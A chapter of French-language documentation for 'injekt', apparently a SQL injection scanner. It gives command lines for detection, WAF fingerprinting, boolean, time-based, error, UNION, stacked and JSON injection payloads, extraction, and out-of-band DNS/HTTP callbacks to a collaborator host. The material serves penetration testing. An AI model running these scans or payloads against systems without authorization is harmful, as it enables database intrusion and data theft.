# 03 — Scan & détection

Moteur : `parse → baseline → detection → fingerprint → extraction(opt-in)`,
concurrence bornée `buffer_unordered(threads)`, `tokio::time::timeout` partout,
`CancellationToken` (Ctrl+C propre), barres `indicatif`, logs `tracing`.

## 3.1 Scan minimal viable

```bash
# Détection par défaut (all techniques, 5 threads) :
injekt --target "https://example.com/search?q=1" --threads 5
injekt scan --target "https://example.com/?id=1"   # équivalent explicite
injekt -u "https://shop.example.com/product?id=42" -v   # debug ciblé

# Toujours valider le plan avant sur cible sensible :
injekt --target "https://example.com/?id=1" --profile stealth --dry-run
```

## 3.2 Baseline & WAF (lire avant d'attaquer)

1. **Baseline** : 3-5 requêtes saines → SHA-256 + moyenne/σ des réponses.
2. **Fingerprint WAF/CDN** : statuts + headers + corps de challenge.
3. **Diff** : Levenshtein + Jaccard → `DiffResult{similarity,time_delta,confidence}`.
4. **Confirmation** : paires TRUE/FALSE inversées, min 3 essais.

Comportement WAF :
- **Blocage actif** (403/406 répétés ou challenge) → `Baseline::is_waf_blocked()` + tamper auto `space2comment` + baisse de confiance.
- **Simple présence CDN** → informative, pas de tamper auto.

```bash
# Ne pas forcer si WAF actif : baisser la voilure, observer en -v :
injekt --target "https://waf.example.com/?id=1" --profile stealth -v
# Filtrer les faux positifs infra (429/503 = négatifs, jamais de finding) :
injekt --target "https://example.com/?id=1" --ignore-code 429,503
# Baseline/WAF tourne AVANT ce filtre et n'est jamais ignorée.
```

## 3.3 Les 7 techniques (quoi, quand, comment)

```bash
# Rapide / discret (2 techniques, faible bruit) :
injekt --target "https://example.com/?id=1" --techniques boolean,error

# Aveugle temporel (forcer DBMS si connu) :
injekt --target "https://example.com/?id=1" --techniques time --dbms postgres

# Verbose errors :
injekt --target "https://example.com/?id=1" --techniques error

# Union (extraction) :
injekt --target "https://example.com/?id=1" --techniques union --extract

# Tout (défaut) :
injekt --target "https://example.com/?id=1" --techniques all
```

| Technique | Signal exploité | Payloads (extraits `src/techniques/`) | Quand l'isoler |
|---|---|---|---|
| `boolean` | Diff TRUE (`OR 1=1`) vs FALSE (`AND 1=2`), commentaire par DBMS | `OR 1=1` / `AND 1=1` | Tri rapide, WAF inconnu, OPSEC |
| `time` | Délai `> baseline+2σ` | `SLEEP/pg_sleep/WAITFOR/BENCHMARK` | Blind total, pages stables |
| `error` | Erreur SQL reflétée (masquée des faux positifs) | `EXTRACTVALUE/CONVERT/CAST` | Messages d'erreur verbeux |
| `union` | Diff + énumération `ORDER BY` (colonnes) | `UNION SELECT` / `ORDER BY n` | Finding boolean confirmé → dumper |
| `stacked` | Marqueur `; SELECT` (garde SELECT-only) | `; SELECT …` | Stacked queries suspectées (rare) |
| `oob` | Callback DNS/HTTP collaborateur | DNS/HTTP par DBMS | Blind sans diff ni erreur (OPT-IN, voir 3.6) |
| `json` | Dual boolean+error sur fonctions JSON | `JSON_EXTRACT/->>/JSON_VALUE/OPENJSON/JSON_EXISTS` | Endpoints API/configs/blobs JSON |

```bash
# Forcer l'oracle d'extraction (réduit le set de techniques) :
injekt --target "https://example.com/?id=1" --fetch-using boolean
injekt --target "https://example.com/?id=1" --fetch-using time
injekt --target "https://example.com/?id=1" --fetch-using direct
```

## 3.4 `--level` 1-5 (budget de payloads)

```bash
injekt --target "https://example.com/?id=1" --level 1   # défaut : budget historique
injekt --target "https://example.com/?id=1" --level 2   # double le budget
injekt --target "https://example.com/?id=1" --level 3   # tout + ORDER BY élargi (+ equaltolike auto)
injekt --target "https://example.com/?id=1" --profile aggressive  # = level 3 par défaut
```

Stratégie : **toujours L1 d'abord**. L2 si page instable/bruit. L3+ uniquement sur
cible confirmée intéressante + fenêtre autorisée (coût requêtes ×N).

## 3.5 Matchers : réduire les faux positifs/négatifs

```bash
# La réponse DOIT contenir (sinon veto) :
injekt --target "https://example.com/?id=1" --string "Welcome"
# La réponse NE DOIT PAS contenir (sinon veto) :
injekt --target "https://example.com/?id=1" --not-string "out of stock"
# Statut imposé (sinon veto) :
injekt --target "https://example.com/?id=1" --code 200
# Strip HTML avant comparaison (pages riches/JS) :
injekt --target "https://example.com/?id=1" --text-only
# Combiné (page produit instable) :
injekt --target "https://example.com/?id=1" --text-only --not-string "captcha" --ignore-code 429,503
```

Cas d'usage :
- Page avec CSRF/publicité rotative → `--text-only`.
- Message métier stable ("Bienvenue X" / "0 résultats") → `--string/--not-string`.
- API JSON → `--code` + `--dbms` + `--techniques json`.

`--confirm` : seconde passe stricte (rejoue chaque finding sur son seul paramètre
dans une session fraîche, ~2× requêtes, OOB exclu). Actuellement : warning loggé,
confirmation in-detection (3 essais) toujours active même sans le flag.

## 3.6 OOB — out-of-band (OPT-IN, infra opérateur)

L'egress part du **serveur DB cible**, pas via `--proxy`. Collaborateur **auto-hébergé**
recommandé (interactsh/oastify self-hosted), jamais de domaine tiers non contrôlé.

```bash
injekt --target "https://example.com/?id=1" \
  --oob-domain x.oastify.com \
  --oob-poll-url "https://x.oastify.com/poll/{token}" \
  --techniques oob \
  --oob-wait-secs 10
```

- Sans `--oob-poll-url` contenant `{token}` : sondes **envoyées mais jamais auto-confirmées**
  (vérif manuelle UI collaborateur, **aucun finding sans preuve**).
- `--oob-wait-secs` (défaut 5) : attente de la requête DB asynchrone avant polling.

## 3.7 Réseau du scan (rappels, détails chap. 6)

```bash
injekt --target "https://example.com/?id=1" \
  --threads 5 --timeout 30 --retries 3 --delay 500 \
  --rate-limit 10 --jitter "750,250"
# jitter en MILLISECONDES, actif même sans flag (750±250, plancher 200).
# rate-limit toujours appliqué (pas de mode illimité).
```

## 3.8 Lecture d'un résultat

- Console : findings (`paramètre × technique × DBMS × confiance`) + `request_count`.
- `--output report.json` : seule source de vérité (voir chap. 8).
- `0 finding` + `request_count` élevé + WAF détecté → passer au chap. 4 (évasion),
  pas à l'extraction.
- `1 finding boolean L1` → chap. 5 (fingerprint forcé + union/extract), pas L5 immédiat.
